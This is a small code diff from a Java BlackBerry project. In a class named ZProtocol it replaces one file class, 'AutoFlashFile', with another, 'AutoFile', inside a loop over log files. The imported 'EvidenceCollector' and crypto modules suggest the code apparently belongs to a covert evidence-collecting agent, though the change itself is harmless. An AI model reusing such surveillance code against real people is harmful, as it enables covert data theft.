@@ -27,7 +27,7 @@ import blackberry.crypto.EncryptionPKCS5;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceCollector;
-import blackberry.fs.AutoFlashFile;
+import blackberry.fs.AutoFile;
 import blackberry.fs.Directory;
 import blackberry.fs.Path;
 import blackberry.utils.Check;
@@ -672,7 +672,7 @@ public class ZProtocol extends Protocol {
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
                 final String fullLogName = basePath + dir + logName;
-                final AutoFlashFile file = new AutoFlashFile(fullLogName, false);
+                final AutoFile file = new AutoFile(fullLogName, false);
                 if (!file.exists()) {
                     //#ifdef DEBUG
                     debug.error("File doesn't exist: " + fullLogName);
